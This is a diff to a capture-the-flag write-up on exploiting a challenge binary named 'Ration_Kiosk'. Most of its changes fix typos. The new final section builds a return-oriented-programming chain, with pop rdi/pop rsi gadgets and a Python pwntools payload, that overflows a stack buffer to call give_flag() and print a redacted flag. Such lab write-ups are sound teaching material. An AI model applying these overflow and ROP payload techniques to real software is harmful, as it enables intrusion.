@@ -83,7 +83,7 @@ $ pwn cyclic -l 0x6161617661616175
 80
 ----
 
-== Disasembling
+== Disassembling
 
 ----
 $ r2 Ration_Kiosk
@@ -128,7 +128,7 @@ INFO: Analyze all functions arguments/locals (afva@@F)
 
 We see `main()` compares two values and prints "unreachable" if they match.
 It also sets some buffer options.
-Other that that, it calls `handle_request()`, which is the function mentioned in RIP's value in GBD's output when we overflowed the buffer.
+Other that that, it calls `handle_request()`, which is the function mentioned in RIP's value in GDB's output when we overflowed the buffer.
 
 What does `handle_request()` do?
 
@@ -175,11 +175,11 @@ What does `handle_request()` do?
 └           0x00401936      c3             ret
 ----
 
-. reserves 0x50 (80) bytes on the stack (`sub rsp, 0x50`)
-. writes the `kiosk>` prompt
-. reads our input
-. echoes our input
-. returns to `main`
+. Reserves 0x50 (80) bytes on the stack (`sub rsp, 0x50`)
+. Writes the `kiosk>` prompt
+. Reads our input
+. Echoes our input
+. Returns to `main`
 
 Our input is read to the 80-byte reserved space on the stack.
 `read()` is called with a limit of 0x4000 (1024 bytes), more than the 80 reserved bytes.
@@ -207,7 +207,7 @@ Then, when `leave` (equivalent to `mov rsp, rbp; pop rbp`) is executed, the stac
 This explains why in GDB we saw part of the overflow string in RBP.
 
 The overflow next overwrites the saved RIP.
-When `ret` is executed we end up jumping to an address controlled by us.
+When RET is executed we end up jumping to an address controlled by us.
 Since previously we wrote an invalid (non-mapped) address to it (part of the string), the program can no longer continue and it segfaults.
 If we write a valid address, we can control the execution's flow.
 
@@ -299,7 +299,7 @@ So... We want to call this function so that it decrypts an prints the flag.
 
 == Calling `give_flag()`
 
-All we need to do is overwrite ``main()``'s stored RIP on the stack with the address from `give_flag()` so that when `ret` is executed in `handle_request()` we jump to `give_flag()` rather than `main`.
+All we need to do is overwrite ``main()``'s stored RIP on the stack with the address from `give_flag()` so that when RET is executed in `handle_request()` we jump to `give_flag()` rather than `main`.
 
 ----
 $ python
@@ -478,3 +478,84 @@ And there's also a 8-byte `subsidy_beta`, which seems suspicious.
 My bet was then that these two together were the XOR key.
 
 Next, let's test that theory.
+
+== Applying the XOR key (Exploiting `Ration_Kiosk`)
+
+At this point, to test our theory we could just dump `flag_ct` and XOR it with `subsidy_alpha` and `subsidy_beta` with Python or something.
+But where's the fun in that?!
+Let's try to get the flag by running and exploiting `Ration_Kiosk`!
+
+In <<_calling_give_flag>> we already started developing an exploit.
+What we need to do now is supply `subsidy_alpha` and `subsidy_beta` as arguments to `give_flag()`.
+We know that it's arguments are taken from RDI and RSI.
+We also know there's the `admin_audit` sequence that pops RDI and RSI from the stack:
+
+----
+[0x004017b5]> pd 10
+            ;-- admin_audit:
+            ; DATA XREF from main @ 0x40193b(r)
+            0x004017b5      5f             pop rdi
+            0x004017b6      c3             ret
+            0x004017b7      5e             pop rsi
+            0x004017b8      c3             ret
+┌ 257: sym.give_flag (int64_t arg1, int64_t arg2); // noreturn
+│ `- args(rdi, rsi) vars(12:sp[0xc..0x78])
+│           0x004017b9      55             push rbp
+│           0x004017ba      4889e5         mov rbp, rsp
+│           0x004017bd      4883ec70       sub rsp, 0x70
+----
+
+So our plan will be:
+
+. Buffer overflow `handle_request()` to place the XOR key in the stack and jump to `0x004017b5` (`pop rdi`)
+. Use the following RET to jump to `0x004017b7` (`pop rsi`)
+. Use the following RET to jump to `give_flag()`
+. Let `give_flag()` do its XOR magic and hopefully print the flag
+
+To do this, we want the stack to look as follows when `handle_request()` returns:
+
+----
+|                    |                  
+|--------------------|                  
+|     0x004017b9     | give_flag()      
+|--------------------|                  
+| 0x5ba309172ef28a39 | subsidy_beta     
+|--------------------|                  
+|     0x004017b7     | (pop rsi; ret)   
+|--------------------|                   |
+| 0x9222be43747b1144 | subsidy_alpha     | stack
+|--------------------|                   | growth
+|     0x004017b5     | (pop rdi; ret)    |
+|--------------------|                   v
+|         XX         | main's RBP       
+|--------------------|                  
+|                    |                  
+|         XX         | 80-byte buffer   
+|                    |                  
+|--------------------|                  
+----
+
+Let's write our payload with Python:
+
+----
+>>> from pwnlib.util.packing import *
+>>> b =  p8(0)*80
+>>> b += p64(0)
+>>> b += p64(0x004017b5)
+>>> b += p64(0x9222be43747b1144)
+>>> b += p64(0x004017b7)
+>>> b += p64(0x5ba309172ef28a39)
+>>> b += p64(0x004017b9)
+>>> open("payload.raw", "wb").write(b)
+128
+----
+
+And feed it to `Ration_Kiosk`...
+
+----
+$ ./Ration_Kiosk < payload.raw
+kiosk> Acknowledged household:
+SDG{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
+----
+
+Success! :)
